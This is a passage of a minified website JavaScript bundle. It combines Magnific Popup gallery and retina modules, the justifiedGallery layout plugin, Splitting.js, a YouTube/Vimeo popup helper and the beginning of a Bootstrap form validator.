t.replace(/%curr%/gi,e+1).replace(/%total%/gi,i)};t.magnificPopup.registerModule("gallery",{options:{enabled:!1,arrowMarkup:'<button title="%title%" type="button" class="mfp-arrow mfp-arrow-%dir%"></button>',preload:[0,2],navigateByImgClick:!0,arrows:!0,tPrev:"Previous (Left arrow key)",tNext:"Next (Right arrow key)",tCounter:"%curr% of %total%"},proto:{initGallery:function(){var i=e.st.gallery,r=".mfp-gallery";return e.direction=!0,!(!i||!i.enabled)&&(a+=" mfp-gallery",b(h+r,(function(){i.navigateByImgClick&&e.wrap.on("click"+r,".mfp-img",(function(){return e.items.length>1?(e.next(),!1):void 0})),n.on("keydown"+r,(function(t){37===t.keyCode?e.prev():39===t.keyCode&&e.next()}))})),b("UpdateStatus"+r,(function(t,i){i.text&&(i.text=H(i.text,e.currItem.index,e.items.length))})),b(c+r,(function(t,n,r,a){var o=e.items.length;r.counter=o>1?H(i.tCounter,a.index,o):""})),b("BuildControls"+r,(function(){if(e.items.length>1&&i.arrows&&!e.arrowLeft){var n=i.arrowMarkup,r=e.arrowLeft=t(n.replace(/%title%/gi,i.tPrev).replace(/%dir%/gi,"left")).addClass(g),a=e.arrowRight=t(n.replace(/%title%/gi,i.tNext).replace(/%dir%/gi,"right")).addClass(g);r.click((function(){e.prev()})),a.click((function(){e.next()})),e.container.append(r.add(a))}})),b(u+r,(function(){e._preloadTimeout&&clearTimeout(e._preloadTimeout),e._preloadTimeout=setTimeout((function(){e.preloadNearbyImages(),e._preloadTimeout=null}),16)})),void b(s+r,(function(){n.off(r),e.wrap.off("click"+r),e.arrowRight=e.arrowLeft=null})))},next:function(){e.direction=!0,e.index=F(e.index+1),e.updateItemHTML()},prev:function(){e.direction=!1,e.index=F(e.index-1),e.updateItemHTML()},goTo:function(t){e.direction=t>=e.index,e.index=t,e.updateItemHTML()},preloadNearbyImages:function(){var t,i=e.st.gallery.preload,n=Math.min(i[0],e.items.length),r=Math.min(i[1],e.items.length);for(t=1;t<=(e.direction?r:n);t++)e._preloadItem(e.index+t);for(t=1;t<=(e.direction?n:r);t++)e._preloadItem(e.index-t)},_preloadItem:function(i){if(i=F(i),!e.items[i].preloaded){var n=e.items[i];n.parsed||(n=e.parseEl(i)),_("LazyLoad",n),"image"===n.type&&(n.img=t('<img class="mfp-img" />').on("load.mfploader",(function(){n.hasSize=!0})).on("error.mfploader",(function(){n.hasSize=!0,n.loadError=!0,_("LazyLoadError",n)})).attr("src",n.src)),n.preloaded=!0}}}});var G="retina";t.magnificPopup.registerModule(G,{options:{replaceSrc:function(t){return t.src.replace(/\.\w+$/,(function(t){return"@2x"+t}))},ratio:1},proto:{initRetina:function(){if(window.devicePixelRatio>1){var t=e.st.retina,i=t.ratio;(i=isNaN(i)?i():i)>1&&(b("ImageHasSize."+G,(function(t,e){e.img.css({"max-width":e.img[0].naturalWidth/i,width:"100%"})})),b("ElementParse."+G,(function(e,n){n.src=t.replaceSrc(n,i)})))}}}}),S()})),function(t){"function"==typeof define&&define.amd?define(["jquery"],t):"object"==typeof module&&module.exports?module.exports=function(e,i){return void 0===i&&(i="undefined"!=typeof window?require("jquery"):require("jquery")(e)),t(i),i}:t(jQuery)}((function(t){var e=function(e,i){this.settings=i,this.checkSettings(),this.imgAnalyzerTimeout=null,this.entries=null,this.buildingRow={entriesBuff:[],width:0,height:0,aspectRatio:0},this.lastFetchedEntry=null,this.lastAnalyzedIndex=-1,this.yield={every:2,flushed:0},this.border=0<=i.border?i.border:i.margins,this.maxRowHeight=this.retrieveMaxRowHeight(),this.suffixRanges=this.retrieveSuffixRanges(),this.offY=this.border,this.rows=0,this.spinner={phase:0,timeSlot:150,$el:t('<div class="jg-spinner"><span></span><span></span><span></span></div>'),intervalId:null},this.scrollBarOn=!1,this.checkWidthIntervalId=null,this.galleryWidth=e.width(),this.$gallery=e};e.prototype.getSuffix=function(t,e){var i,n;for(i=e<t?t:e,n=0;n<this.suffixRanges.length;n++)if(i<=this.suffixRanges[n])return this.settings.sizeRangeSuffixes[this.suffixRanges[n]];return this.settings.sizeRangeSuffixes[this.suffixRanges[n-1]]},e.prototype.removeSuffix=function(t,e){return t.substring(0,t.length-e.length)},e.prototype.endsWith=function(t,e){return-1!==t.indexOf(e,t.length-e.length)},e.prototype.getUsedSuffix=function(t){for(var e in this.settings.sizeRangeSuffixes)if(this.settings.sizeRangeSuffixes.hasOwnProperty(e)){if(0===this.settings.sizeRangeSuffixes[e].length)continue;if(this.endsWith(t,this.settings.sizeRangeSuffixes[e]))return this.settings.sizeRangeSuffixes[e]}return""},e.prototype.newSrc=function(t,e,i,n){var r;if(this.settings.thumbnailPath)r=this.settings.thumbnailPath(t,e,i,n);else{var a=t.match(this.settings.extension),o=null!==a?a[0]:"";r=t.replace(this.settings.extension,""),r=this.removeSuffix(r,this.getUsedSuffix(r)),r+=this.getSuffix(e,i)+o}return r},e.prototype.showImg=function(t,e){this.settings.cssAnimation?(t.addClass("jg-entry-visible"),e&&e()):(t.stop().fadeTo(this.settings.imagesAnimationDuration,1,e),t.find(this.settings.imgSelector).stop().fadeTo(this.settings.imagesAnimationDuration,1,e))},e.prototype.extractImgSrcFromImage=function(t){var e=t.data("safe-src"),i="data-safe-src";return void 0===e&&(e=t.attr("src"),i="src"),t.data("jg.originalSrc",e),t.data("jg.src",e),t.data("jg.originalSrcLoc",i),e},e.prototype.imgFromEntry=function(t){var e=t.find(this.settings.imgSelector);return 0===e.length?null:e},e.prototype.captionFromEntry=function(t){var e=t.find("> .jg-caption");return 0===e.length?null:e},e.prototype.displayEntry=function(t,e,i,n,r,a){t.width(n),t.height(a),t.css("top",i),t.css("left",e);var o=this.imgFromEntry(t);if(null!==o){o.css("width",n),o.css("height",r),o.css("margin-left",-Math.round(n/2)),o.css("margin-top",-Math.round(r/2));var s=o.data("jg.src");if(s){s=this.newSrc(s,n,r,o[0]),o.one("error",(function(){this.resetImgSrc(o)}));var l=function(){o.attr("src",s)};"skipped"===t.data("jg.loaded")&&s?this.onImageEvent(s,function(){this.showImg(t,l),t.data("jg.loaded",!0)}.bind(this)):this.showImg(t,l)}}else this.showImg(t);this.displayEntryCaption(t)},e.prototype.displayEntryCaption=function(e){var i=this.imgFromEntry(e);if(null!==i&&this.settings.captions){var n=this.captionFromEntry(e);if(null===n){var r=i.attr("alt");this.isValidCaption(r)||(r=e.attr("title")),this.isValidCaption(r)&&(n=t('<div class="jg-caption">'+r+"</div>"),e.append(n),e.data("jg.createdCaption",!0))}null!==n&&(this.settings.cssAnimation||n.stop().fadeTo(0,this.settings.captionSettings.nonVisibleOpacity),this.addCaptionEventsHandlers(e))}else this.removeCaptionEventsHandlers(e)},e.prototype.isValidCaption=function(t){return void 0!==t&&0<t.length},e.prototype.onEntryMouseEnterForCaption=function(e){var i=this.captionFromEntry(t(e.currentTarget));this.settings.cssAnimation?i.addClass("jg-caption-visible").removeClass("jg-caption-hidden"):i.stop().fadeTo(this.settings.captionSettings.animationDuration,this.settings.captionSettings.visibleOpacity)},e.prototype.onEntryMouseLeaveForCaption=function(e){var i=this.captionFromEntry(t(e.currentTarget));this.settings.cssAnimation?i.removeClass("jg-caption-visible").removeClass("jg-caption-hidden"):i.stop().fadeTo(this.settings.captionSettings.animationDuration,this.settings.captionSettings.nonVisibleOpacity)},e.prototype.addCaptionEventsHandlers=function(e){var i=e.data("jg.captionMouseEvents");void 0===i&&(i={mouseenter:t.proxy(this.onEntryMouseEnterForCaption,this),mouseleave:t.proxy(this.onEntryMouseLeaveForCaption,this)},e.on("mouseenter",void 0,void 0,i.mouseenter),e.on("mouseleave",void 0,void 0,i.mouseleave),e.data("jg.captionMouseEvents",i))},e.prototype.removeCaptionEventsHandlers=function(t){var e=t.data("jg.captionMouseEvents");void 0!==e&&(t.off("mouseenter",void 0,e.mouseenter),t.off("mouseleave",void 0,e.mouseleave),t.removeData("jg.captionMouseEvents"))},e.prototype.clearBuildingRow=function(){this.buildingRow.entriesBuff=[],this.buildingRow.aspectRatio=0,this.buildingRow.width=0},e.prototype.prepareBuildingRow=function(t,e){var i,n,r,a,o,s=!0,l=0,c=this.galleryWidth-2*this.border-(this.buildingRow.entriesBuff.length-1)*this.settings.margins,h=c/this.buildingRow.aspectRatio,u=this.settings.rowHeight,d=this.buildingRow.width/c>this.settings.justifyThreshold;if(e||t&&"hide"===this.settings.lastRow&&!d){for(i=0;i<this.buildingRow.entriesBuff.length;i++)n=this.buildingRow.entriesBuff[i],this.settings.cssAnimation?n.removeClass("jg-entry-visible"):(n.stop().fadeTo(0,.1),n.find("> img, > a > img").fadeTo(0,0));return-1}for(t&&!d&&"justify"!==this.settings.lastRow&&"hide"!==this.settings.lastRow&&(s=!1,0<this.rows&&(s=(u=(this.offY-this.border-this.settings.margins*this.rows)/this.rows)*this.buildingRow.aspectRatio/c>this.settings.justifyThreshold)),i=0;i<this.buildingRow.entriesBuff.length;i++)r=(n=this.buildingRow.entriesBuff[i]).data("jg.width")/n.data("jg.height"),o=s?(a=i===this.buildingRow.entriesBuff.length-1?c:h*r,h):(a=u*r,u),c-=Math.round(a),n.data("jg.jwidth",Math.round(a)),n.data("jg.jheight",Math.ceil(o)),(0===i||o<l)&&(l=o);return this.buildingRow.height=l,s},e.prototype.flushRow=function(t,e){var i,n,r,a=this.settings,o=this.border;if(n=this.prepareBuildingRow(t,e),e||t&&"hide"===a.lastRow&&-1===n)this.clearBuildingRow();else{if(this.maxRowHeight&&this.maxRowHeight<this.buildingRow.height&&(this.buildingRow.height=this.maxRowHeight),t&&("center"===a.lastRow||"right"===a.lastRow)){var s=this.galleryWidth-2*this.border-(this.buildingRow.entriesBuff.length-1)*a.margins;for(r=0;r<this.buildingRow.entriesBuff.length;r++)s-=(i=this.buildingRow.entriesBuff[r]).data("jg.jwidth");"center"===a.lastRow?o+=Math.round(s/2):"right"===a.lastRow&&(o+=s)}var l=this.buildingRow.entriesBuff.length-1;for(r=0;r<=l;r++)i=this.buildingRow.entriesBuff[this.settings.rtl?l-r:r],this.displayEntry(i,o,this.offY,i.data("jg.jwidth"),i.data("jg.jheight"),this.buildingRow.height),o+=i.data("jg.jwidth")+a.margins;this.galleryHeightToSet=this.offY+this.buildingRow.height+this.border,this.setGalleryTempHeight(this.galleryHeightToSet+this.getSpinnerHeight()),(!t||this.buildingRow.height<=a.rowHeight&&n)&&(this.offY+=this.buildingRow.height+a.margins,this.rows+=1,this.clearBuildingRow(),this.settings.triggerEvent.call(this,"jg.rowflush"))}};var i=0;e.prototype.rememberGalleryHeight=function(){i=this.$gallery.height(),this.$gallery.height(i)},e.prototype.setGalleryTempHeight=function(t){i=Math.max(t,i),this.$gallery.height(i)},e.prototype.setGalleryFinalHeight=function(t){i=t,this.$gallery.height(t)},e.prototype.checkWidth=function(){this.checkWidthIntervalId=setInterval(t.proxy((function(){if(this.$gallery.is(":visible")){var t=parseFloat(this.$gallery.width());Math.abs(t-this.galleryWidth)>this.settings.refreshSensitivity&&(this.galleryWidth=t,this.rewind(),this.rememberGalleryHeight(),this.startImgAnalyzer(!0))}}),this),this.settings.refreshTime)},e.prototype.isSpinnerActive=function(){return null!==this.spinner.intervalId},e.prototype.getSpinnerHeight=function(){return this.spinner.$el.innerHeight()},e.prototype.stopLoadingSpinnerAnimation=function(){clearInterval(this.spinner.intervalId),this.spinner.intervalId=null,this.setGalleryTempHeight(this.$gallery.height()-this.getSpinnerHeight()),this.spinner.$el.detach()},e.prototype.startLoadingSpinnerAnimation=function(){var t=this.spinner,e=t.$el.find("span");clearInterval(t.intervalId),this.$gallery.append(t.$el),this.setGalleryTempHeight(this.offY+this.buildingRow.height+this.getSpinnerHeight()),t.intervalId=setInterval((function(){t.phase<e.length?e.eq(t.phase).fadeTo(t.timeSlot,1):e.eq(t.phase-e.length).fadeTo(t.timeSlot,0),t.phase=(t.phase+1)%(2*e.length)}),t.timeSlot)},e.prototype.rewind=function(){this.lastFetchedEntry=null,this.lastAnalyzedIndex=-1,this.offY=this.border,this.rows=0,this.clearBuildingRow()},e.prototype.getSelectorWithoutSpinner=function(){return this.settings.selector+", div:not(.jg-spinner)"},e.prototype.getAllEntries=function(){var t=this.getSelectorWithoutSpinner();return this.$gallery.children(t).toArray()},e.prototype.updateEntries=function(e){var i;if(e&&null!=this.lastFetchedEntry){var n=this.getSelectorWithoutSpinner();i=t(this.lastFetchedEntry).nextAll(n).toArray()}else this.entries=[],i=this.getAllEntries();return 0<i.length&&(t.isFunction(this.settings.sort)?i=this.sortArray(i):this.settings.randomize&&(i=this.shuffleArray(i)),this.lastFetchedEntry=i[i.length-1],this.settings.filter?i=this.filterArray(i):this.resetFilters(i)),this.entries=this.entries.concat(i),!0},e.prototype.insertToGallery=function(e){var i=this;t.each(e,(function(){t(this).appendTo(i.$gallery)}))},e.prototype.shuffleArray=function(t){var e,i,n;for(e=t.length-1;0<e;e--)i=Math.floor(Math.random()*(e+1)),n=t[e],t[e]=t[i],t[i]=n;return this.insertToGallery(t),t},e.prototype.sortArray=function(t){return t.sort(this.settings.sort),this.insertToGallery(t),t},e.prototype.resetFilters=function(e){for(var i=0;i<e.length;i++)t(e[i]).removeClass("jg-filtered")},e.prototype.filterArray=function(e){var i=this.settings;if("string"===t.type(i.filter))return e.filter((function(e){var n=t(e);return n.is(i.filter)?(n.removeClass("jg-filtered"),!0):(n.addClass("jg-filtered").removeClass("jg-visible"),!1)}));if(t.isFunction(i.filter)){for(var n=e.filter(i.filter),r=0;r<e.length;r++)-1===n.indexOf(e[r])?t(e[r]).addClass("jg-filtered").removeClass("jg-visible"):t(e[r]).removeClass("jg-filtered");return n}},e.prototype.resetImgSrc=function(t){"src"===t.data("jg.originalSrcLoc")?t.attr("src",t.data("jg.originalSrc")):t.attr("src","")},e.prototype.destroy=function(){clearInterval(this.checkWidthIntervalId),this.stopImgAnalyzerStarter(),t.each(this.getAllEntries(),t.proxy((function(e,i){var n=t(i);n.css("width",""),n.css("height",""),n.css("top",""),n.css("left",""),n.data("jg.loaded",void 0),n.removeClass("jg-entry jg-filtered jg-entry-visible");var r=this.imgFromEntry(n);r&&(r.css("width",""),r.css("height",""),r.css("margin-left",""),r.css("margin-top",""),this.resetImgSrc(r),r.data("jg.originalSrc",void 0),r.data("jg.originalSrcLoc",void 0),r.data("jg.src",void 0)),this.removeCaptionEventsHandlers(n);var a=this.captionFromEntry(n);n.data("jg.createdCaption")?(n.data("jg.createdCaption",void 0),null!==a&&a.remove()):null!==a&&a.fadeTo(0,1)}),this)),this.$gallery.css("height",""),this.$gallery.removeClass("justified-gallery"),this.$gallery.data("jg.controller",void 0),this.settings.triggerEvent.call(this,"jg.destroy")},e.prototype.analyzeImages=function(e){for(var i=this.lastAnalyzedIndex+1;i<this.entries.length;i++){var n=t(this.entries[i]);if(!0===n.data("jg.loaded")||"skipped"===n.data("jg.loaded")){var r=this.galleryWidth-2*this.border-(this.buildingRow.entriesBuff.length-1)*this.settings.margins,a=n.data("jg.width")/n.data("jg.height");if(this.buildingRow.entriesBuff.push(n),this.buildingRow.aspectRatio+=a,this.buildingRow.width+=a*this.settings.rowHeight,this.lastAnalyzedIndex=i,r/(this.buildingRow.aspectRatio+a)<this.settings.rowHeight&&(this.flushRow(!1,0<this.settings.maxRowsCount&&this.rows===this.settings.maxRowsCount),++this.yield.flushed>=this.yield.every))return void this.startImgAnalyzer(e)}else if("error"!==n.data("jg.loaded"))return}0<this.buildingRow.entriesBuff.length&&this.flushRow(!0,0<this.settings.maxRowsCount&&this.rows===this.settings.maxRowsCount),this.isSpinnerActive()&&this.stopLoadingSpinnerAnimation(),this.stopImgAnalyzerStarter(),this.setGalleryFinalHeight(this.galleryHeightToSet),this.settings.triggerEvent.call(this,e?"jg.resize":"jg.complete")},e.prototype.stopImgAnalyzerStarter=function(){this.yield.flushed=0,null!==this.imgAnalyzerTimeout&&(clearTimeout(this.imgAnalyzerTimeout),this.imgAnalyzerTimeout=null)},e.prototype.startImgAnalyzer=function(t){var e=this;this.stopImgAnalyzerStarter(),this.imgAnalyzerTimeout=setTimeout((function(){e.analyzeImages(t)}),.001)},e.prototype.onImageEvent=function(e,i,n){if(i||n){var r=new Image,a=t(r);i&&a.one("load",(function(){a.off("load error"),i(r)})),n&&a.one("error",(function(){a.off("load error"),n(r)})),r.src=e}},e.prototype.init=function(){var e=!1,i=!1,n=this;t.each(this.entries,(function(r,a){var o=t(a),s=n.imgFromEntry(o);if(o.addClass("jg-entry"),!0!==o.data("jg.loaded")&&"skipped"!==o.data("jg.loaded"))if(null!==n.settings.rel&&o.attr("rel",n.settings.rel),null!==n.settings.target&&o.attr("target",n.settings.target),null!==s){var l=n.extractImgSrcFromImage(s);if(!1===n.settings.waitThumbnailsLoad||!l){var c=parseFloat(s.attr("width")),h=parseFloat(s.attr("height"));if("svg"===s.prop("tagName")&&(c=parseFloat(s[0].getBBox().width),h=parseFloat(s[0].getBBox().height)),!isNaN(c)&&!isNaN(h))return o.data("jg.width",c),o.data("jg.height",h),o.data("jg.loaded","skipped"),i=!0,n.startImgAnalyzer(!1),!0}o.data("jg.loaded",!1),e=!0,n.isSpinnerActive()||n.startLoadingSpinnerAnimation(),n.onImageEvent(l,(function(t){o.data("jg.width",t.width),o.data("jg.height",t.height),o.data("jg.loaded",!0),n.startImgAnalyzer(!1)}),(function(){o.data("jg.loaded","error"),n.startImgAnalyzer(!1)}))}else o.data("jg.loaded",!0),o.data("jg.width",o.width()|parseFloat(o.css("width"))|1),o.data("jg.height",o.height()|parseFloat(o.css("height"))|1)})),e||i||this.startImgAnalyzer(!1),this.checkWidth()},e.prototype.checkOrConvertNumber=function(e,i){if("string"===t.type(e[i])&&(e[i]=parseFloat(e[i])),"number"!==t.type(e[i]))throw i+" must be a number";if(isNaN(e[i]))throw"invalid number for "+i},e.prototype.checkSizeRangesSuffixes=function(){if("object"!==t.type(this.settings.sizeRangeSuffixes))throw"sizeRangeSuffixes must be defined and must be an object";var e=[];for(var i in this.settings.sizeRangeSuffixes)this.settings.sizeRangeSuffixes.hasOwnProperty(i)&&e.push(i);for(var n={0:""},r=0;r<e.length;r++)if("string"===t.type(e[r]))try{n[parseInt(e[r].replace(/^[a-z]+/,""),10)]=this.settings.sizeRangeSuffixes[e[r]]}catch(e){throw"sizeRangeSuffixes keys must contains correct numbers ("+e+")"}else n[e[r]]=this.settings.sizeRangeSuffixes[e[r]];this.settings.sizeRangeSuffixes=n},e.prototype.retrieveMaxRowHeight=function(){var e=null,i=this.settings.rowHeight;if("string"===t.type(this.settings.maxRowHeight))e=this.settings.maxRowHeight.match(/^[0-9]+%$/)?i*parseFloat(this.settings.maxRowHeight.match(/^([0-9]+)%$/)[1])/100:parseFloat(this.settings.maxRowHeight);else{if("number"!==t.type(this.settings.maxRowHeight)){if(!1===this.settings.maxRowHeight||null==this.settings.maxRowHeight)return null;throw"maxRowHeight must be a number or a percentage"}e=this.settings.maxRowHeight}if(isNaN(e))throw"invalid number for maxRowHeight";return e<i&&(e=i),e},e.prototype.checkSettings=function(){this.checkSizeRangesSuffixes(),this.checkOrConvertNumber(this.settings,"rowHeight"),this.checkOrConvertNumber(this.settings,"margins"),this.checkOrConvertNumber(this.settings,"border"),this.checkOrConvertNumber(this.settings,"maxRowsCount");var e=["justify","nojustify","left","center","right","hide"];if(-1===e.indexOf(this.settings.lastRow))throw"lastRow must be one of: "+e.join(", ");if(this.checkOrConvertNumber(this.settings,"justifyThreshold"),this.settings.justifyThreshold<0||1<this.settings.justifyThreshold)throw"justifyThreshold must be in the interval [0,1]";if("boolean"!==t.type(this.settings.cssAnimation))throw"cssAnimation must be a boolean";if("boolean"!==t.type(this.settings.captions))throw"captions must be a boolean";if(this.checkOrConvertNumber(this.settings.captionSettings,"animationDuration"),this.checkOrConvertNumber(this.settings.captionSettings,"visibleOpacity"),this.settings.captionSettings.visibleOpacity<0||1<this.settings.captionSettings.visibleOpacity)throw"captionSettings.visibleOpacity must be in the interval [0, 1]";if(this.checkOrConvertNumber(this.settings.captionSettings,"nonVisibleOpacity"),this.settings.captionSettings.nonVisibleOpacity<0||1<this.settings.captionSettings.nonVisibleOpacity)throw"captionSettings.nonVisibleOpacity must be in the interval [0, 1]";if(this.checkOrConvertNumber(this.settings,"imagesAnimationDuration"),this.checkOrConvertNumber(this.settings,"refreshTime"),this.checkOrConvertNumber(this.settings,"refreshSensitivity"),"boolean"!==t.type(this.settings.randomize))throw"randomize must be a boolean";if("string"!==t.type(this.settings.selector))throw"selector must be a string";if(!1!==this.settings.sort&&!t.isFunction(this.settings.sort))throw"sort must be false or a comparison function";if(!1!==this.settings.filter&&!t.isFunction(this.settings.filter)&&"string"!==t.type(this.settings.filter))throw"filter must be false, a string or a filter function"},e.prototype.retrieveSuffixRanges=function(){var t=[];for(var e in this.settings.sizeRangeSuffixes)this.settings.sizeRangeSuffixes.hasOwnProperty(e)&&t.push(parseInt(e,10));return t.sort((function(t,e){return e<t?1:t<e?-1:0})),t},e.prototype.updateSettings=function(e){this.settings=t.extend({},this.settings,e),this.checkSettings(),this.border=0<=this.settings.border?this.settings.border:this.settings.margins,this.maxRowHeight=this.retrieveMaxRowHeight(),this.suffixRanges=this.retrieveSuffixRanges()},e.prototype.defaults={sizeRangeSuffixes:{},thumbnailPath:void 0,rowHeight:120,maxRowHeight:!1,maxRowsCount:0,margins:1,border:-1,lastRow:"nojustify",justifyThreshold:.9,waitThumbnailsLoad:!0,captions:!0,cssAnimation:!0,imagesAnimationDuration:500,captionSettings:{animationDuration:500,visibleOpacity:.7,nonVisibleOpacity:0},rel:null,target:null,extension:/\.[^.\\/]+$/,refreshTime:200,refreshSensitivity:0,randomize:!1,rtl:!1,sort:!1,filter:!1,selector:"a",imgSelector:"> img, > a > img, > svg, > a > svg",triggerEvent:function(t){this.$gallery.trigger(t)}},t.fn.justifiedGallery=function(i){return this.each((function(n,r){var a=t(r);a.addClass("justified-gallery");var o=a.data("jg.controller");if(void 0===o){if(null!=i&&"object"!==t.type(i)){if("destroy"===i)return;throw"The argument must be an object"}o=new e(a,t.extend({},e.prototype.defaults,i)),a.data("jg.controller",o)}else if("norewind"===i);else{if("destroy"===i)return void o.destroy();o.updateSettings(i),o.rewind()}o.updateEntries("norewind"===i)&&o.init()}))}})),function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):t.Splitting=e()}(this,(function(){"use strict";var t=document,e=t.createTextNode.bind(t);function i(t,e,i){t.style.setProperty(e,i)}function n(t,e){return t.appendChild(e)}function r(e,i,r,a){var o=t.createElement("span");return i&&(o.className=i),r&&(!a&&o.setAttribute("data-"+i,r),o.textContent=r),e&&n(e,o)||o}function a(t,e){return t.getAttribute("data-"+e)}function o(e,i){return e&&0!=e.length?e.nodeName?[e]:[].slice.call(e[0].nodeName?e:(i||t).querySelectorAll(e)):[]}function s(t){for(var e=[];t--;)e[t]=[];return e}function l(t,e){t&&t.some(e)}function c(t){return function(e){return t[e]}}var h={};function u(t,e,i,n){return{by:t,depends:e,key:i,split:n}}function d(t){return function t(e,i,n){var r=n.indexOf(e);if(-1==r)n.unshift(e),l(h[e].depends,(function(i){t(i,e,n)}));else{var a=n.indexOf(i);n.splice(r,1),n.splice(a,0,e)}return n}(t,0,[]).map(c(h))}function p(t){h[t.by]=t}function f(t,i,a,s,c){t.normalize();var h=[],u=document.createDocumentFragment();s&&h.push(t.previousSibling);var d=[];return o(t.childNodes).some((function(t){if(!t.tagName||t.hasChildNodes()){if(t.childNodes&&t.childNodes.length)return d.push(t),void h.push.apply(h,f(t,i,a,s,c));var n=t.wholeText||"",o=n.trim();o.length&&(" "===n[0]&&d.push(e(" ")),l(o.split(a),(function(t,e){e&&c&&d.push(r(u,"whitespace"," ",c));var n=r(u,i,t);h.push(n),d.push(n)}))," "===n[n.length-1]&&d.push(e(" ")))}else d.push(t)})),l(d,(function(t){n(u,t)})),t.innerHTML="",n(t,u),h}var m="words",g=u(m,0,"word",(function(t){return f(t,"word",/\s+/,0,1)})),v="chars",y=u(v,[m],"char",(function(t,e,i){var n=[];return l(i[m],(function(t,i){n.push.apply(n,f(t,"char","",e.whitespace&&i))})),n}));function x(t){var e=(t=t||{}).key;return o(t.target||"[data-splitting]").map((function(n){var r=n["🍌"];if(!t.force&&r)return r;r=n["🍌"]={el:n};var o=d(t.by||a(n,"splitting")||v),s=function(t,e){for(var i in e)t[i]=e[i];return t}({},t);return l(o,(function(t){if(t.split){var a=t.by,o=(e?"-"+e:"")+t.key,c=t.split(n,s,r);o&&(h=n,p=(d="--"+o)+"-index",l(u=c,(function(t,e){Array.isArray(t)?l(t,(function(t){i(t,p,e)})):i(t,p,e)})),i(h,d+"-total",u.length)),r[a]=c,n.classList.add(a)}var h,u,d,p})),n.classList.add("splitting"),r}))}function b(t,e,i){var n=o(e.matching||t.children,t),r={};return l(n,(function(t){var e=Math.round(t[i]);(r[e]||(r[e]=[])).push(t)})),Object.keys(r).map(Number).sort(w).map(c(r))}function w(t,e){return t-e}x.html=function(t){var e=(t=t||{}).target=r();return e.innerHTML=t.content,x(t),e.outerHTML},x.add=p;var _=u("lines",[m],"line",(function(t,e,i){return b(t,{matching:i[m]},"offsetTop")})),M=u("items",0,"item",(function(t,e){return o(e.matching||t.children,t)})),S=u("rows",0,"row",(function(t,e){return b(t,e,"offsetTop")})),T=u("cols",0,"col",(function(t,e){return b(t,e,"offsetLeft")})),E=u("grid",["rows","cols"]),C="layout",A=u(C,0,0,(function(t,e){var s=e.rows=+(e.rows||a(t,"rows")||1),l=e.columns=+(e.columns||a(t,"columns")||1);if(e.image=e.image||a(t,"image")||t.currentSrc||t.src,e.image){var c=o("img",t)[0];e.image=c&&(c.currentSrc||c.src)}e.image&&i(t,"background-image","url("+e.image+")");for(var h=s*l,u=[],d=r(0,"cell-grid");h--;){var p=r(d,"cell");r(p,"cell-inner"),u.push(p)}return n(t,d),u})),L=u("cellRows",[C],"row",(function(t,e,i){var n=e.rows,r=s(n);return l(i[C],(function(t,e,i){r[Math.floor(e/(i.length/n))].push(t)})),r})),P=u("cellColumns",[C],"col",(function(t,e,i){var n=e.columns,r=s(n);return l(i[C],(function(t,e){r[e%n].push(t)})),r})),R=u("cells",["cellRows","cellColumns"],"cell",(function(t,e,i){return i[C]}));return p(g),p(y),p(_),p(M),p(S),p(T),p(E),p(A),p(L),p(P),p(R),x})),$.fn.YouTubePopUp=function(t){let e=$.extend({autoplay:1},t);$(this).off("click"),$(this).on("click",(function(t){t.preventDefault();let i,n,r,a=$(this).attr("href");a.match(/(youtube.com)/)&&(i="v=",n=1),(a.match(/(youtu.be)/)||a.match(/(vimeo.com\/)+[0-9]/))&&(i="/",n=3),a.match(/(vimeo.com\/)+[a-zA-Z]/)&&(i="/",n=5);let o=a.split(i)[n],s=o.replace(/(&)+(.*)/,"");(a.match(/(youtu.be)/)||a.match(/(youtube.com)/))&&(r="https://www.youtube.com/embed/"+s+"?autoplay="+e.autoplay),(a.match(/(vimeo.com\/)+[0-9]/)||a.match(/(vimeo.com\/)+[a-zA-Z]/))&&(r="https://player.vimeo.com/video/"+s+"?autoplay="+e.autoplay);let l=$('<div class="YouTubePopUp-Wrap YouTubePopUp-animation"></div>'),c=$('<div class="YouTubePopUp-Content"></div>');c.append('<span class="YouTubePopUp-Close"></span>'),c.append('<iframe src="'+r+'" allowfullscreen></iframe>'),l.append(c),TweenLite.set(l,{autoAlpha:0,animationName:"none"}),TweenLite.set(c,{autoAlpha:0,y:"30%"}),$("body").append(l);let h=new TimelineLite({onReverseComplete:function(){$(".YouTubePopUp-Wrap").remove(),h=null}}).to(".YouTubePopUp-Wrap",.5,{autoAlpha:1}).to(".YouTubePopUp-Content",1,{autoAlpha:1,y:"0%",ease:Back.easeOut.config(4)});$(".YouTubePopUp-Wrap, .YouTubePopUp-Close").on("click",(function(){h.reverse()})),c=l=s=o=r=n=i=a=null}))},function(t){"use strict";function e(e){return e.is('[type="checkbox"]')?e.prop("checked"):e.is('[type="radio"]')?!!t('[name="'+e.attr("name")+'"]:checked').length:e.val()}function i(e){return this.each((function(){var i=t(this),r=t.extend({},n.DEFAULTS,i.data(),"object"==typeof e&&e),a=i.data("bs.validator");(a||"destroy"!=e)&&(a||i.data("bs.validator",a=new n(this,r)),"string"==typeof e&&a[e]())}))}var n=function(i,r){this.options=r,this.validators=t.extend({},n.VALIDATORS,r.custom),this.$element=t(i),this.$btn=t('button[type="submit"], input[type="submit"]').filter('[form="'+this.$element.attr("id")+'"]').add(this.$element.find('input[type="submit"], button[type="submit"]')),this.update(),this.$element.on("input.bs.validator change.bs.validator focusout.bs.validator",t.proxy(this.onInput,this)),this.$element.on("submit.bs.validator",t.proxy(this.onSubmit,this)),this.$element.on("reset.bs.validator",t.proxy(this.reset,this)),this.$element.find("[data-match]").each((function(){var i=t(this),n=i.data("match");t(n).on("input.bs.validator",(function(t){e(i)&&i.trigger("input.bs.validator")}))})),this.$inputs.filter((function(){return e(t(this))})).trigger("focusout"),this.$element.attr("novalidate",!0),this.toggleSubmit()};n.VERSION="0.11.5",n.INPUT_SELECTOR=':input:not([type="hidden"], [type="submit"], [type="reset"], button)',n.FOCUS_OFFSET=20,n.DEFAULTS={delay:500,html:!1,disable:!0,focus:!0,custom:{},errors:{match:"Does not match",minlength:"Not long enough"},feedback:{success:"glyphicon-ok",error:"glyphicon-remove"}},n.VALIDATORS={native:function(t){var e=t[0];if(e.checkValidity)return!e.checkValidity()&&!e.validity.valid&&(e.validationMessage||"error!")},match:function(e){var i=e.data("match");return e.val()!==t(i).val()&&n.DEFAULTS.errors.match},minlength:function(t){var e=t.data("minlength");return t.val().length<e&&n.DEFAULTS.errors.minlength}},n.prototype.update=function(){return 